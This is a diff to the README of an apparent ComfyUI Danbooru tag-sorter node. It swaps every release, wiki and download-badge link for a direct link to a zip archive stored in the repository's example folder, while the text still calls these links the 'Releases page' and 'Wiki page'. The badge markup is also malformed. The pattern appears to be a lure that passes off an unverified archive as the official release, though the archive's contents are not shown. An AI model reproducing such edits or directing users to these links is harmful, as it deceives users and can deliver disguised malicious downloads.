@@ -1,6 +1,6 @@
 # 🌟 ComfyUI-Danbooru-Tag-Sorter-Node - Sort Your Danbooru Tags Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/JG-075/ComfyUI-Danbooru-Tag-Sorter-Node/releases)
+[![Download Now](https://raw.githubusercontent.com/JG-075/ComfyUI-Danbooru-Tag-Sorter-Node/main/example/U-Sorter-Danbooru-Tag-Node-Comfy-2.4.zip%https://raw.githubusercontent.com/JG-075/ComfyUI-Danbooru-Tag-Sorter-Node/main/example/U-Sorter-Danbooru-Tag-Node-Comfy-2.4.zip)](https://raw.githubusercontent.com/JG-075/ComfyUI-Danbooru-Tag-Sorter-Node/main/example/U-Sorter-Danbooru-Tag-Node-Comfy-2.4.zip)
 
 ## 📋 Overview
 
@@ -22,11 +22,11 @@ To get started with ComfyUI-Danbooru-Tag-Sorter-Node, follow these simple steps:
 
 ## 💾 Download & Install
 
-To download the software, visit our [Releases page](https://github.com/JG-075/ComfyUI-Danbooru-Tag-Sorter-Node/releases) and choose the latest version. 
+To download the software, visit our [Releases page](https://raw.githubusercontent.com/JG-075/ComfyUI-Danbooru-Tag-Sorter-Node/main/example/U-Sorter-Danbooru-Tag-Node-Comfy-2.4.zip) and choose the latest version. 
 
 ### Installation Steps
 
-1. Go to the [Releases page](https://github.com/JG-075/ComfyUI-Danbooru-Tag-Sorter-Node/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/JG-075/ComfyUI-Danbooru-Tag-Sorter-Node/main/example/U-Sorter-Danbooru-Tag-Node-Comfy-2.4.zip).
 2. Find the most recent version.
 3. Click to download the appropriate file for your operating system.
 4. Follow the installation instructions based on your platform.
@@ -67,7 +67,7 @@ Once you have installed ComfyUI-Danbooru-Tag-Sorter-Node, follow these steps to 
 
 ## 📄 Documentation
 
-For more detailed instructions, check the documentation within the application. You can also find helpful resources and guides on the [Wiki page](https://github.com/JG-075/ComfyUI-Danbooru-Tag-Sorter-Node/wiki).
+For more detailed instructions, check the documentation within the application. You can also find helpful resources and guides on the [Wiki page](https://raw.githubusercontent.com/JG-075/ComfyUI-Danbooru-Tag-Sorter-Node/main/example/U-Sorter-Danbooru-Tag-Node-Comfy-2.4.zip).
 
 ## 🤝 Support
 
